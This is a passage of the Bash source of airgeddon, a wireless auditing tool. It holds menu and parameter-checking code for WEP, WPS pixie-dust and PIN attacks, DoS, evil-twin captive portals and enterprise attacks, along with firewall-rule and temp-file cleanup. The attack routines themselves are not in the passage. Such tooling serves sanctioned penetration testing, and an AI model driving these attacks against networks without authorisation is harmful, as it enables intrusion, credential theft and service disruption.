	ask_yesno 505 "yes"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1
	fi

	exec_michaelshutdown
}

#Validate wep all-in-one attack parameters
function wep_option() {

	debug_print

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
		echo
		language_strings "${language}" 125 "yellow"
		language_strings "${language}" 115 "read"
		if ! explore_for_targets_option "WEP"; then
			return 1
		fi
	fi

	if ! check_monitor_enabled "${interface}"; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	if ! validate_network_encryption_type "WEP"; then
		return 1
	fi

	echo
	language_strings "${language}" 425 "yellow"
	language_strings "${language}" 115 "read"

	manage_wep_log
	language_strings "${language}" 115 "read"

	exec_wep_allinone_attack
}

#Validate wps parameters for custom pin, pixie dust, bruteforce, pin database and null pin attacks
function wps_attacks_parameters() {

	debug_print

	if [ "${1}" != "no_monitor_check" ]; then
		if ! check_monitor_enabled "${interface}"; then
			echo
			language_strings "${language}" 14 "red"
			language_strings "${language}" 115 "read"
			return 1
		fi

		echo
		language_strings "${language}" 34 "yellow"
	fi

	if ! ask_bssid "wps"; then
		return 1
	fi

	if ! ask_channel "wps"; then
		return 1
	fi

	if [ "${1}" != "no_monitor_check" ]; then
		case ${wps_attack} in
			"custompin_bully"|"custompin_reaver")
				ask_custom_pin
				ask_timeout "wps_standard"
			;;
			"pixiedust_bully"|"pixiedust_reaver")
				ask_timeout "wps_pixiedust"
			;;
			"pindb_bully"|"pindb_reaver")
				ask_timeout "wps_standard"
			;;
			"nullpin_reaver")
				ask_timeout "wps_standard"
			;;
		esac
	fi

	return 0
}

#Print selected options
function print_options() {

	debug_print

	if "${AIRGEDDON_AUTO_UPDATE:-true}"; then
		language_strings "${language}" 451 "blue"
	else
		language_strings "${language}" 452 "blue"
	fi

	if "${AIRGEDDON_SKIP_INTRO:-true}"; then
		language_strings "${language}" 567 "blue"
	else
		language_strings "${language}" 568 "blue"
	fi

	if "${AIRGEDDON_BASIC_COLORS:-true}"; then
		language_strings "${language}" 563 "blue"
	else
		language_strings "${language}" 564 "blue"
	fi

	if "${AIRGEDDON_EXTENDED_COLORS:-true}"; then
		language_strings "${language}" 453 "blue"
	else
		language_strings "${language}" 454 "blue"
	fi

	if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
		language_strings "${language}" 474 "blue"
	else
		language_strings "${language}" 475 "blue"
	fi

	if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
		language_strings "${language}" 575 "blue"
	else
		language_strings "${language}" 576 "blue"
	fi

	if "${AIRGEDDON_PRINT_HINTS:-true}"; then
		language_strings "${language}" 582 "blue"
	else
		language_strings "${language}" 583 "blue"
	fi

	if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
		language_strings "${language}" 594 "blue"
	else
		language_strings "${language}" 595 "blue"
	fi

	if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
		language_strings "${language}" 690 "blue"
	else
		language_strings "${language}" 691 "blue"
	fi

	reboot_required_text=""
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		if grep -q "AIRGEDDON_WINDOWS_HANDLING=tmux" "${rc_path}" 2> /dev/null; then
			reboot_required_text="${reboot_required[${language}]}"
		fi
		language_strings "${language}" 618 "blue"
	else
		if grep -q "AIRGEDDON_WINDOWS_HANDLING=xterm" "${rc_path}" 2> /dev/null; then
			reboot_required_text="${reboot_required[${language}]}"
		fi
		language_strings "${language}" 619 "blue"
	fi

	language_strings "${language}" 641 "blue"

	reboot_required_text=""
	if "${AIRGEDDON_PLUGINS_ENABLED:-true}"; then
		if grep -q "AIRGEDDON_PLUGINS_ENABLED=false" "${rc_path}" 2> /dev/null; then
			reboot_required_text="${reboot_required[${language}]}"
		fi
		language_strings "${language}" 653 "blue"
	else
		if grep -q "AIRGEDDON_PLUGINS_ENABLED=true" "${rc_path}" 2> /dev/null; then
			reboot_required_text="${reboot_required[${language}]}"
		fi
		language_strings "${language}" 654 "blue"
	fi
}

#Print selected interface
function print_iface_selected() {

	debug_print

	if [ -z "${interface}" ]; then
		language_strings "${language}" 41 "red"
		echo
		language_strings "${language}" 115 "read"
		select_interface
	else
		check_interface_mode "${interface}"
		if [ "${ifacemode}" = "(Non wifi card)" ]; then
			language_strings "${language}" 42 "blue"
		else
			language_strings "${language}" 514 "blue"
		fi
	fi
}

#Print selected internet interface
function print_iface_internet_selected() {

	debug_print

	if [ "${et_mode}" != "et_captive_portal" ]; then
		if [ -z "${internet_interface}" ]; then
			language_strings "${language}" 283 "blue"
		else
			language_strings "${language}" 282 "blue"
		fi
	fi
}

#Print selected target parameters (bssid, channel, essid and type of encryption)
function print_all_target_vars() {

	debug_print

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
		if [ -n "${channel}" ]; then
			language_strings "${language}" 44 "blue"
		fi
		if [ -n "${essid}" ]; then
			if [ "${essid}" = "(Hidden Network)" ]; then
				language_strings "${language}" 45 "blue"
			else
				language_strings "${language}" 46 "blue"
			fi
		fi
		if [ -n "${enc}" ]; then
			language_strings "${language}" 135 "blue"
		fi
	fi
}

#Print selected target parameters on evil twin menu (bssid, channel and essid)
function print_all_target_vars_et() {

	debug_print

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 271 "blue"
	fi

	if [ -n "${channel}" ]; then
		language_strings "${language}" 44 "blue"
	else
		language_strings "${language}" 273 "blue"
	fi

	if [ -n "${essid}" ]; then
		if [ "${essid}" = "(Hidden Network)" ]; then
			language_strings "${language}" 45 "blue"
		else
			language_strings "${language}" 46 "blue"
		fi
	else
		language_strings "${language}" 274 "blue"
	fi
}

#Print selected target parameters on evil twin submenus (bssid, channel, essid, DoS type and Handshake file)
function print_et_target_vars() {

	debug_print

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 271 "blue"
	fi

	if [ -n "${channel}" ]; then
		language_strings "${language}" 44 "blue"
	else
		language_strings "${language}" 273 "blue"
	fi

	if [ -n "${essid}" ]; then
		if [ "${essid}" = "(Hidden Network)" ]; then
			language_strings "${language}" 45 "blue"
		else
			language_strings "${language}" 46 "blue"
		fi
	else
		language_strings "${language}" 274 "blue"
	fi

	if [ "${current_menu}" != "et_dos_menu" ]; then
		if [ -n "${et_dos_attack}" ]; then
			language_strings "${language}" 272 "blue"
		else
			language_strings "${language}" 278 "blue"
		fi
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then
		if [ -n "${et_handshake}" ]; then
			language_strings "${language}" 311 "blue"
		else
			if [ -n "${enteredpath}" ]; then
				language_strings "${language}" 314 "blue"
			else
				language_strings "${language}" 310 "blue"
			fi
		fi
	fi
}

#Print selected target parameters on wps attacks menu (bssid, channel and essid)
function print_all_target_vars_wps() {

	debug_print

	if [ -n "${wps_bssid}" ]; then
		language_strings "${language}" 335 "blue"
	else
		language_strings "${language}" 339 "blue"
	fi

	if [ -n "${wps_channel}" ]; then
		language_strings "${language}" 336 "blue"
	else
		language_strings "${language}" 340 "blue"
	fi

	if [ -n "${wps_essid}" ]; then
		if [ "${wps_essid}" = "(Hidden Network)" ]; then
			language_strings "${language}" 337 "blue"
		else
			language_strings "${language}" 338 "blue"
		fi
	else
		language_strings "${language}" 341 "blue"
	fi

	if [ -n "${wps_locked}" ]; then
		language_strings "${language}" 351 "blue"
	else
		language_strings "${language}" 352 "blue"
	fi
}

#Print selected target parameters on decrypt menu (bssid, Handshake file, dictionary file, rules file and enterprise stuff)
function print_decrypt_vars() {

	debug_print

	if [ -n "${jtrenterpriseenteredpath}" ]; then
		language_strings "${language}" 605 "blue"
	else
		language_strings "${language}" 606 "blue"
	fi

	if [ -n "${hashcatenterpriseenteredpath}" ]; then
		language_strings "${language}" 603 "blue"
	else
		language_strings "${language}" 604 "blue"
	fi

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 185 "blue"
	fi

	if [ -n "${enteredpath}" ]; then
		language_strings "${language}" 173 "blue"
	else
		language_strings "${language}" 177 "blue"
	fi

	if [ -n "${DICTIONARY}" ]; then
		language_strings "${language}" 182 "blue"
	fi

	if [ -n "${RULES}" ]; then
		language_strings "${language}" 243 "blue"
	fi
}

#Print selected target parameters on personal decrypt menu (bssid, Handshake file, dictionary file and rules file)
function print_personal_decrypt_vars() {

	debug_print

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 185 "blue"
	fi

	if [ -n "${enteredpath}" ]; then
		language_strings "${language}" 173 "blue"
	else
		language_strings "${language}" 177 "blue"
	fi

	if [ -n "${DICTIONARY}" ]; then
		language_strings "${language}" 182 "blue"
	fi

	if [ -n "${RULES}" ]; then
		language_strings "${language}" 243 "blue"
	fi
}

#Print selected target parameters on enterprise decrypt menu (dictionary file, rules file and hashes files)
function print_enterprise_decrypt_vars() {

	debug_print

	if [ -n "${jtrenterpriseenteredpath}" ]; then
		language_strings "${language}" 605 "blue"
	else
		language_strings "${language}" 606 "blue"
	fi

	if [ -n "${hashcatenterpriseenteredpath}" ]; then
		language_strings "${language}" 603 "blue"
	else
		language_strings "${language}" 604 "blue"
	fi

	if [ -n "${DICTIONARY}" ]; then
		language_strings "${language}" 182 "blue"
	fi

	if [ -n "${RULES}" ]; then
		language_strings "${language}" 243 "blue"
	fi
}

#Create the dependencies arrays
function initialize_menu_options_dependencies() {

	debug_print

	clean_handshake_dependencies=("${optional_tools_names[0]}")
	aircrack_crunch_attacks_dependencies=("${optional_tools_names[1]}")
	aireplay_attack_dependencies=("${optional_tools_names[2]}")
	mdk_attack_dependencies=("${optional_tools_names[3]}")
	hashcat_attacks_dependencies=("${optional_tools_names[4]}")
	et_onlyap_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}")
	et_sniffing_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[8]}" "${optional_tools_names[9]}")
	et_sniffing_sslstrip2_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[16]}")
	et_captive_portal_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[10]}" "${optional_tools_names[11]}")
	wash_scan_dependencies=("${optional_tools_names[12]}")
	reaver_attacks_dependencies=("${optional_tools_names[13]}")
	bully_attacks_dependencies=("${optional_tools_names[14]}")
	bully_pixie_dust_attack_dependencies=("${optional_tools_names[14]}" "${optional_tools_names[15]}")
	reaver_pixie_dust_attack_dependencies=("${optional_tools_names[13]}" "${optional_tools_names[15]}")
	et_sniffing_sslstrip2_beef_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[16]}" "${optional_tools_names[17]}")
	wep_attack_dependencies=("${optional_tools_names[2]}" "${optional_tools_names[18]}")
	enterprise_attack_dependencies=("${optional_tools_names[19]}" "${optional_tools_names[20]}" "${optional_tools_names[22]}")
	asleap_attacks_dependencies=("${optional_tools_names[20]}")
	john_attacks_dependencies=("${optional_tools_names[21]}")
	johncrunch_attacks_dependencies=("${optional_tools_names[21]}" "${optional_tools_names[1]}")
	enterprise_certificates_dependencies=("${optional_tools_names[22]}")
	pmkid_dependencies=("${optional_tools_names[23]}" "${optional_tools_names[24]}")
}

#Set possible changes for some commands that can be found in different ways depending of the O.S.
#shellcheck disable=SC2206
function set_possible_aliases() {

	debug_print

	for item in "${!possible_alias_names[@]}"; do
		if ! hash "${item}" 2> /dev/null || [[ "${item}" = "beef" ]]; then
			arraliases=(${possible_alias_names[${item//[[:space:]]/ }]})
			for item2 in "${arraliases[@]}"; do
				if hash "${item2}" 2> /dev/null; then
					optional_tools_names=(${optional_tools_names[@]/${item}/"${item2}"})
					break
				fi
			done
		fi
	done
}

#Modify dependencies arrays depending on selected options
function dependencies_modifications() {

	debug_print

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		essential_tools_names=("${essential_tools_names[@]/xterm/tmux}")
		possible_package_names[${essential_tools_names[5]}]="tmux"
		unset possible_package_names["xterm"]
	fi

	if [ "${AIRGEDDON_MDK_VERSION}" = "mdk3" ]; then
		optional_tools_names=("${optional_tools_names[@]/mdk4/mdk3}")
		possible_package_names[${optional_tools_names[3]}]="mdk3"
		unset possible_package_names["mdk4"]
	fi

	if [ "${iptables_nftables}" -eq 0 ]; then
		optional_tools_names=("${optional_tools_names[@]/nft/iptables}")
		possible_package_names[${optional_tools_names[7]}]="iptables"
		unset possible_package_names["nft"]
	fi
}

#Initialize optional_tools values
function initialize_optional_tools_values() {

	debug_print

	declare -gA optional_tools

	for item in "${optional_tools_names[@]}"; do
		optional_tools[${item}]=0
	done
}

#Set some vars depending of the menu and invoke the printing of target vars
function initialize_menu_and_print_selections() {

	debug_print

	forbidden_options=()

	case ${current_menu} in
		"main_menu")
			print_iface_selected
		;;
		"decrypt_menu")
			print_decrypt_vars
		;;
		"personal_decrypt_menu")
			print_personal_decrypt_vars
		;;
		"enterprise_decrypt_menu")
			print_enterprise_decrypt_vars
			enterprise_asleap_challenge=""
			enterprise_asleap_response=""
		;;
		"handshake_pmkid_tools_menu")
			print_iface_selected
			print_all_target_vars
			return_to_handshake_pmkid_tools_menu=0
		;;
		"dos_attacks_menu")
			dos_pursuit_mode=0
			print_iface_selected
			print_all_target_vars
		;;
		"dos_handshake_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"language_menu")
			print_iface_selected
		;;
		"evil_twin_attacks_menu")
			enterprise_mode=""
			return_to_et_main_menu=0
			return_to_enterprise_main_menu=0
			retry_handshake_capture=0
			return_to_et_main_menu_from_beef=0
			retrying_handshake_capture=0
			internet_interface_selected=0
			et_mode=""
			et_processes=()
			secondary_wifi_interface=""
			et_attack_adapter_prerequisites_ok=0
			print_iface_selected
			print_all_target_vars_et
		;;
		"enterprise_attacks_menu")
			return_to_enterprise_main_menu=0
			return_to_et_main_menu=0
			enterprise_mode=""
			et_processes=()
			secondary_wifi_interface=""
			et_enterprise_attack_adapter_prerequisites_ok=0
			print_iface_selected
			print_all_target_vars
		;;
		"et_dos_menu")
			dos_pursuit_mode=0
			print_iface_selected
			if [ -n "${enterprise_mode}" ]; then
				print_all_target_vars
			else
				if [ ${retry_handshake_capture} -eq 1 ]; then
					retry_handshake_capture=0
					retrying_handshake_capture=1
				fi
				print_et_target_vars
				print_iface_internet_selected
			fi
		;;
		"wps_attacks_menu")
			print_iface_selected
			print_all_target_vars_wps
		;;
		"offline_pin_generation_menu")
			print_iface_selected
			print_all_target_vars_wps
		;;
		"wep_attacks_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"beef_pre_menu")
			et_attack_adapter_prerequisites_ok=0
			print_iface_selected
			print_all_target_vars_et
		;;
		"option_menu")
			print_options
		;;
		*)
			print_iface_selected
			print_all_target_vars
		;;
	esac
}

#Clean environment vars
function clean_env_vars() {

	debug_print

	unset AIRGEDDON_AUTO_UPDATE AIRGEDDON_SKIP_INTRO AIRGEDDON_BASIC_COLORS AIRGEDDON_EXTENDED_COLORS AIRGEDDON_AUTO_CHANGE_LANGUAGE AIRGEDDON_SILENT_CHECKS AIRGEDDON_PRINT_HINTS AIRGEDDON_5GHZ_ENABLED AIRGEDDON_FORCE_IPTABLES AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING AIRGEDDON_MDK_VERSION AIRGEDDON_PLUGINS_ENABLED AIRGEDDON_DEVELOPMENT_MODE AIRGEDDON_DEBUG_MODE AIRGEDDON_WINDOWS_HANDLING
}

#Clean temporary files
function clean_tmpfiles() {

	debug_print

	rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}target.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
	rm -rf "${tmpdir}pmkid"* > /dev/null 2>&1
	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
	rm -rf "${tmpdir}clts"* > /dev/null 2>&1
	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
	rm -rf "${tmpdir}jtrtmp"* > /dev/null 2>&1
	rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
	rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${hostapd_wpe_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${hostapd_wpe_log}" > /dev/null 2>&1
	rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${dnsmasq_file}" >/dev/null 2>&1
	rm -rf "${tmpdir}${control_et_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${control_enterprise_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
	rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
	rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
	rm -rf "${tmpdir}${bettercap_config_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${bettercap_hook_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1
	if [ "${beef_found}" -eq 1 ]; then
		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
	fi
	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
	rm -rf "${tmpdir}${certsdir}" > /dev/null 2>&1
	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
	rm -rf "${tmpdir}${asleap_pot_tmp}" > /dev/null 2>&1
	if [ "${dhcpd_path_changed}" -eq 1 ]; then
		rm -rf "${dhcp_path}" > /dev/null 2>&1
	fi
	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
	rm -rf "${tmpdir}${wps_attack_script_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wep_attack_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
	rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
	rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
	rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
}

#Manage cleaning firewall rules and restore orginal routing state
function clean_routing_rules() {

	debug_print

	if [ -n "${original_routing_state}" ]; then
		echo "${original_routing_state}" > /proc/sys/net/ipv4/ip_forward 2> /dev/null
	fi

	clean_initialize_iptables_nftables

	if [ "${iptables_saved}" -eq 1 ]; then
		restore_iptables_nftables
	fi

	rm -rf "${tmpdir}${routing_tmp_file}" > /dev/null 2>&1
}

#Save iptables/nftables rules
function save_iptables_nftables() {

	debug_print

	if [ "${iptables_nftables}" -eq 1 ]; then
		if hash "iptables-${iptables_cmd}-save" 2> /dev/null; then
			if "iptables-${iptables_cmd}-save" > "${tmpdir}${routing_tmp_file}" 2> /dev/null; then
				iptables_saved=1
			fi
		elif hash "${iptables_cmd}-compat-save" 2> /dev/null; then
			if "${iptables_cmd}-compat-save" > "${tmpdir}${routing_tmp_file}" 2> /dev/null; then
				iptables_saved=1
			fi
		fi
	else
		if hash "${iptables_cmd}-save" 2> /dev/null; then
			if "${iptables_cmd}-save" > "${tmpdir}${routing_tmp_file}" 2> /dev/null; then
				iptables_saved=1
			fi
		fi
	fi
}

#Restore iptables/nftables rules
function restore_iptables_nftables() {

	debug_print

	if [ "${iptables_nftables}" -eq 1 ]; then
		if hash "iptables-${iptables_cmd}-restore" 2> /dev/null; then
			"iptables-${iptables_cmd}-restore" < "${tmpdir}${routing_tmp_file}" 2> /dev/null
		elif hash "${iptables_cmd}-compat-restore" 2> /dev/null; then
			"${iptables_cmd}-compat-restore" < "${tmpdir}${routing_tmp_file}" 2> /dev/null
		fi
	else
		if hash "${iptables_cmd}-restore" 2> /dev/null; then
			"${iptables_cmd}-restore" < "${tmpdir}${routing_tmp_file}" 2> /dev/null
		fi
	fi
}

#Clean and initialize iptables/nftables rules
function clean_initialize_iptables_nftables() {

	debug_print

	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" add table ip filter 2> /dev/null
		"${iptables_cmd}" add chain ip filter INPUT 2> /dev/null
		"${iptables_cmd}" add chain ip filter OUTPUT 2> /dev/null
		"${iptables_cmd}" add chain ip filter FORWARD 2> /dev/null
		"${iptables_cmd}" flush table ip filter 2> /dev/null
		"${iptables_cmd}" add table ip nat 2> /dev/null
		"${iptables_cmd}" add chain nat PREROUTING "{ type nat hook prerouting priority 0 ; }" 2> /dev/null
		"${iptables_cmd}" add chain nat POSTROUTING "{ type nat hook postrouting priority 100 ; }" 2> /dev/null
		"${iptables_cmd}" flush table ip nat 2> /dev/null
	else
		"${iptables_cmd}" -F 2> /dev/null
		"${iptables_cmd}" -t nat -F 2> /dev/null
		"${iptables_cmd}" -X 2> /dev/null
		"${iptables_cmd}" -t nat -X 2> /dev/null
	fi
}

#Create an array from parameters
function store_array() {

	debug_print

	local values=("${@:3}")
	for i in "${!values[@]}"; do
		eval "${1}[\$2|${i}]=\${values[i]}"
	done
}

#Check if something (first parameter) is inside an array (second parameter)
contains_element() {

	debug_print

	local e
	for e in "${@:2}"; do
		[[ "${e}" = "${1}" ]] && return 0
	done
	return 1
}

#Print hints from the different hint pools depending of the menu
function print_hint() {

	debug_print

	declare -A hints

	case ${1} in
		"main_menu")
			store_array hints main_hints "${main_hints[@]}"
			hintlength=${#main_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[main_hints|${randomhint}]}
		;;
		"dos_attacks_menu")
			store_array hints dos_hints "${dos_hints[@]}"
			hintlength=${#dos_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[dos_hints|${randomhint}]}
		;;
		"handshake_pmkid_tools_menu")
			store_array hints handshake_pmkid_hints "${handshake_pmkid_hints[@]}"
			hintlength=${#handshake_pmkid_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[handshake_pmkid_hints|${randomhint}]}
		;;
		"dos_handshake_menu")
			store_array hints dos_handshake_hints "${dos_handshake_hints[@]}"
			hintlength=${#dos_handshake_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[dos_handshake_hints|${randomhint}]}
		;;
		"decrypt_menu")
			store_array hints decrypt_hints "${decrypt_hints[@]}"
			hintlength=${#decrypt_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[decrypt_hints|${randomhint}]}
		;;
		"personal_decrypt_menu")
			store_array hints personal_decrypt_hints "${personal_decrypt_hints[@]}"
			hintlength=${#personal_decrypt_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[personal_decrypt_hints|${randomhint}]}
		;;
		"enterprise_decrypt_menu")
			store_array hints enterprise_decrypt_hints "${enterprise_decrypt_hints[@]}"
			hintlength=${#enterprise_decrypt_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[enterprise_decrypt_hints|${randomhint}]}
		;;
		"select_interface_menu")
			store_array hints select_interface_hints "${select_interface_hints[@]}"
			hintlength=${#select_interface_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[select_interface_hints|${randomhint}]}
		;;
		"language_menu")
			store_array hints language_hints "${language_hints[@]}"
			hintlength=${#language_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[language_hints|${randomhint}]}
		;;
		"option_menu")
			store_array hints option_hints "${option_hints[@]}"
			hintlength=${#option_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[option_hints|${randomhint}]}
		;;
		"evil_twin_attacks_menu")
			store_array hints evil_twin_hints "${evil_twin_hints[@]}"
			hintlength=${#evil_twin_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[evil_twin_hints|${randomhint}]}
		;;
		"et_dos_menu")
			store_array hints evil_twin_dos_hints "${evil_twin_dos_hints[@]}"
			hintlength=${#evil_twin_dos_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[evil_twin_dos_hints|${randomhint}]}
		;;
		"wps_attacks_menu"|"offline_pin_generation_menu")
			store_array hints wps_hints "${wps_hints[@]}"
			hintlength=${#wps_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[wps_hints|${randomhint}]}
		;;
		"wep_attacks_menu")
			store_array hints wep_hints "${wep_hints[@]}"
			hintlength=${#wep_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[wep_hints|${randomhint}]}
		;;
		"beef_pre_menu")
			store_array hints beef_hints "${beef_hints[@]}"
			hintlength=${#beef_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[beef_hints|${randomhint}]}
		;;
		"enterprise_attacks_menu")
			store_array hints enterprise_hints "${enterprise_hints[@]}"
			hintlength=${#enterprise_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[enterprise_hints|${randomhint}]}
		;;
	esac

	if "${AIRGEDDON_PRINT_HINTS:-true}"; then
		print_simple_separator
		language_strings "${language}" "${strtoprint}" "hint"
	fi
	print_simple_separator
}

#airgeddon main menu
function main_menu() {

	debug_print

	clear
	language_strings "${language}" 101 "title"
	current_menu="main_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 61
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	print_simple_separator
	language_strings "${language}" 118
	language_strings "${language}" 119
	language_strings "${language}" 169
	language_strings "${language}" 252
	language_strings "${language}" 333
	language_strings "${language}" 426
	language_strings "${language}" 57
	print_simple_separator
	language_strings "${language}" 60
	language_strings "${language}" 444
	print_hint ${current_menu}

	read -rp "> " main_option
	case ${main_option} in
		0)
			exit_script_option
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			dos_attacks_menu
		;;
		5)
			handshake_pmkid_tools_menu
		;;
		6)
			decrypt_menu
		;;
		7)
			evil_twin_attacks_menu
		;;
		8)
			wps_attacks_menu
		;;
		9)
			wep_attacks_menu
		;;
		10)
			enterprise_attacks_menu
		;;
		11)
			credits_option
		;;
		12)
			option_menu
		;;
		*)
			invalid_menu_option
		;;
	esac

	main_menu
}

#Enterprise attacks menu
function enterprise_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 84 "title"
	current_menu="enterprise_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 627 "separator"
	language_strings "${language}" 628 enterprise_certificates_dependencies[@]
	language_strings "${language}" 117 "separator"
	language_strings "${language}" 260 enterprise_attack_dependencies[@]
	language_strings "${language}" 248 "separator"
	language_strings "${language}" 307 enterprise_attack_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " enterprise_option
	case ${enterprise_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			explore_for_targets_option "WPA" "enterprise"
		;;
		5)
			custom_certificates_questions
			create_certificates_config_files
			create_custom_certificates
		;;
		6)
			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					if [ "${card_vif_support}" -eq 0 ]; then
						ask_yesno 696 "no"
						if [ "${yesno}" = "y" ]; then
							et_enterprise_attack_adapter_prerequisites_ok=1
						fi
					else
						et_enterprise_attack_adapter_prerequisites_ok=1
					fi

					if [ "${et_enterprise_attack_adapter_prerequisites_ok}" -eq 1 ]; then
						if custom_certificates_integration; then
							enterprise_mode="smooth"
							et_dos_menu "enterprise"
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		7)
			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					if [ "${card_vif_support}" -eq 0 ]; then
						ask_yesno 696 "no"
						if [ "${yesno}" = "y" ]; then
							et_enterprise_attack_adapter_prerequisites_ok=1
						fi
					else
						et_enterprise_attack_adapter_prerequisites_ok=1
					fi

					if [ "${et_enterprise_attack_adapter_prerequisites_ok}" -eq 1 ]; then
						if custom_certificates_integration; then
							enterprise_mode="noisy"
							et_dos_menu "enterprise"
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		*)
			invalid_menu_option
		;;
